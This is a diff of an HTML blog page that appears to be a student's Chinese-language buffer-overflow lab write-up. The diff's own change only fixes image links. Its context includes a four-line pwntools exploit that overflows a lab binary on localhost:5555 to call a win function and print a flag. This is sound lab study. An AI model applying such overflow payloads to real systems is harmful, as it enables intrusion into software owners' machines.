@@ -101,8 +101,8 @@
 <meta property="og:image" content="http://libowei.net/image/网络攻防实验2-4.png">
 <meta property="og:image" content="http://libowei.net/image/网络攻防实验2-5.png">
 <meta property="og:image" content="http://libowei.net/image/网络攻防实验2-6.png">
-<meta property="og:image" content="http://libowei.net/image/网络攻防实验2-7">
-<meta property="og:updated_time" content="2017-03-31T11:34:53.257Z">
+<meta property="og:image" content="http://libowei.net/image/网络攻防实验2-7.png">
+<meta property="og:updated_time" content="2017-03-31T11:35:54.488Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络攻防实验(2)-缓冲区溢出">
 <meta name="twitter:description" content="题目说明说明：该题目由memory、flag两个文件组成。memory为可执行代码，存在缓冲区溢出漏洞，请同学们分析该程序的二进制代码找到漏洞成因，并通过修改程序的执行流程导致任意代码执行漏洞将flag中的FLAG信息输出出来。单机执行：请同学们在自己的机器上运行脚本：./host，5555端口即为程序输入端口。如果编写exploit攻击成功，会出现以下提示：{FLAG:this is a fla">
@@ -436,7 +436,7 @@
 <li>构造payload为23字节字符+win_func地址+任意可访问地址+”cat flag”地址。使用pwntools编写exploit。<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">conn=remote(<span class="string">'localhost'</span>,<span class="number">5555</span>)</div><div class="line">conn.send(<span class="string">'a'</span>*<span class="number">23</span>+p32(<span class="number">0x08048610</span>)+p32(<span class="number">0x08048610</span>)+p32(<span class="number">0x08048840</span>))</div><div class="line">conn.interactive()</div></pre></td></tr></table></figure>
 </li>
 </ol>
-<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p><img src="/image/网络攻防实验2-7" alt="实验结果"></p>
+<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p><img src="/image/网络攻防实验2-7.png" alt="实验结果"></p>
 
       
     </div>
